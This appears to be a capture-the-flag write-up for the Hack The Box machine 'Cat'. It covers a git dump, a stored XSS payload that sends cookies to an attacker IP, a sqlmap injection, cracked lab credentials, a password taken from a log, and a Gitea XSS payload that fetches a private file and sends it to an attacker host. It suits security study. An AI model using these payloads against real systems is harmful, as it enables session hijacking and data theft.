1,Recon
port scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://cat.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Page check
![](images/Pasted%20image%2020250202103813.png)
By using ffuf to enumerate the valid web-contents
```
.htaccess               [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 137ms]
admin.php               [Status: 302, Size: 1, Words: 1, Lines: 2, Duration: 20ms]
                        [Status: 200, Size: 3075, Words: 870, Lines: 130, Duration: 577ms]
css                     [Status: 301, Size: 300, Words: 20, Lines: 10, Duration: 12ms]
.hta                    [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 1000ms]
img                     [Status: 301, Size: 300, Words: 20, Lines: 10, Duration: 15ms]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 1458ms]
.htpasswd               [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 1483ms]
server-status           [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 12ms]
index.php               [Status: 200, Size: 3075, Words: 870, Lines: 130, Duration: 1438ms]
uploads                 [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 10ms]
:: Progress: [4614/4614] :: Job [1/1] :: 140 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
Then we found there is `./git`
So we can use `git-dumper` to pull it down and check the git files.
`git-dumper http://cat.htb/.git/ ./git-repo-dump`
Then we can find something interesting from `config.php` and `admin.php`
config.php
```
cat config.php 
<?php
// Database configuration
$db_file = '/databases/cat.db';

// Connect to the database
try {
    $pdo = new PDO("sqlite:$db_file");
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Error: " . $e->getMessage());
}
?>
```
admin.php
```
<?php
session_start();

include 'config.php';

// Check if the user is logged in
if (!isset($_SESSION['username']) || $_SESSION['username'] !== 'axel') {
    header("Location: /join.php");
    exit();
}

// Fetch cat data from the database
$stmt = $pdo->prepare("SELECT * FROM cats");
$stmt->execute();
$cats = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>

```

By checking the source code, I found there is XSS in the admin viewing page
The tips to exploit it:
```
1, registered user with the name
<script>document.location='http://10.10.16.5/?c='+document.cookie;</script>

2, open your python http.server

3, come to Contest, and send request in the contest with random data

4, get the cookie back and login as admin

python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.53 - - [02/Feb/2025 11:16:15] "GET /?c=PHPSESSID=n8tjmpqrh47hpo4u74tdo5hcjs HTTP/1.1" 200 -
10.10.11.53 - - [02/Feb/2025 11:16:15] code 404, message File not found
10.10.11.53 - - [02/Feb/2025 11:16:15] "GET /favicon.ico HTTP/1.1" 404 -

If there is nothing happen, please reset the machine.
```

Then we successfully login to admin, and from the source code, we find a sql injection from `/accept_cat.php`
```
<?php
include 'config.php';
session_start();

if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);

            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete->execute();

            echo "The cat has been accepted and added successfully.";
        } else {
            echo "Error: Cat ID or Cat Name not provided.";
        }
    } else {
        header("Location: /");
        exit();
    }
} else {
    echo "Access denied.";
}
?>

```
Although it use Insert not used select, but it did not perform parameter escaping.
So we can use sqlmap to crack the database
`sqlmap -r accept-cat-sqli-req -p catName --dbms sqlite --level 5 --risk 3 --technique=BEST --tables`
And we can get the hashes of users
```
1|axel|axel2017@gmail.com|d1bbba3670feb9435c9841e46e60ee2f
2|rosa|rosamendoza485@gmail.com|ac369922d560f17d6eeb8b2c7dec498c
3|robert|robertcervantes2000@gmail.com|42846631708f69c00ec0c0a8aa4a92ad
4|fabian|fabiancarachure2323@gmail.com|39e153e825c4a3d314a0dc7f7475ddbe
5|jerryson|jerrysonC343@gmail.com|781593e060f8d065cd7281c5ec5b4b86
6|larry|larryP5656@gmail.com|1b6dce240bbfbc0905a664ad199e18f8
7|royer|royer.royer2323@gmail.com|c598f6b844a36fa7836fba0835f1f6
8|peter|peterCC456@gmail.com|e41ccefa439fc454f7eadbf1f139ed8a
9|angel|angel234g@gmail.com|24a8ec003ac2e1b3c5953a6f95f8f565
10|jobert|jobert2020@gmail.com|88e4dceccd48820cf77b5cf6c08698ad
11|patch|asdf@asdf|e0a28f0f66c369000ba6590857885b27
```
But we can only crack `rosa` password hash.
`rosa:	soyunaprincesarosa`
And rosa is from `adm` group, that means she can check the log files of apache, and we can also check the `access.log`
Then we found `cat access.log | grep axel`
`/join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q`
We get `axel:aNdZwgC4tI9gnVXv_e3Q` and we can su or ssh

When we switch to the user shell, I would continue to check the net state and sudo -l:
```
axel@cat:~$ sudo -l
[sudo] password for axel: 
Sorry, user axel may not run sudo on cat.
axel@cat:~$ netstat -ntlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:46031         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:35669         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33251         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -   
```
port 3000 seems like our target:
```
<!DOCTYPE html>
<html lang="en-US" data-theme="gitea-auto">
<head>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Cat</title>
        <link rel="manifest" href="data:application/
        .......
        .....
        ...
        ..
        .
```

Let's port forwarding to our local machine.
`ssh axel@cat.htb -L 3000:localhost:3000`
![](images/Pasted%20image%2020250202115129.png)
We get the version of service `Gitea 1.22.0` and by searching the exploits of that, we found
`Gitea 1.22.0 - Stored XSS` from exploit-db

I have prove the exploit and I want the administrator could come to my page and touch off it.
So I come to check the mails of this machine and so many interesting here.

```
axel@cat:/var/mail$ ls
axel  jobert  root
axel@cat:/var/mail$ cat axel 
From rosa@cat.htb  Sat Sep 28 04:51:50 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592
        for <axel@cat.htb>; Sat, 28 Sep 2024 04:51:50 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591
        for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT
Date: Sat, 28 Sep 2024 04:51:49 GMT
From: rosa@cat.htb
Message-Id: <202409280451.48S4pnlT001591@cat.htb>
Subject: New cat services

Hi Axel,

We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.

Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.

From rosa@cat.htb  Sat Sep 28 05:05:28 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268
        for <axel@cat.htb>; Sat, 28 Sep 2024 05:05:28 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267
        for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT
Date: Sat, 28 Sep 2024 05:05:28 GMT
From: rosa@cat.htb
Message-Id: <202409280505.48S55Sm0002267@cat.htb>
Subject: Employee management

We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.

axel@cat:/var/mail$ cat jobert 
cat: jobert: Permission denied
axel@cat:/var/mail$ cat root 
cat: root: Permission denied

```

Let's take this XSS exploits !!!!1
```
1, start python server port 80 on kalibox
2, create repo test
   create blank file in repo called...."test"
3, put this payload in description

<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.xx.xx/?response=' + encodeURIComponent(data))).catch(error => console.error('Error:', error));">XSS test</a>

4, send an email as axel to jobert
axel@cat:/var/mail$ echo -e "Subject: test \n\nHello check my repo http://localhost:3000/axel/test" | sendmail jobert@localhost

5, decode the url encoded data, and you would find the credit of admin

<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
    
    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

header('Location: dashboard.php');
exit;
?>
```

Then `su root` and get your root shell.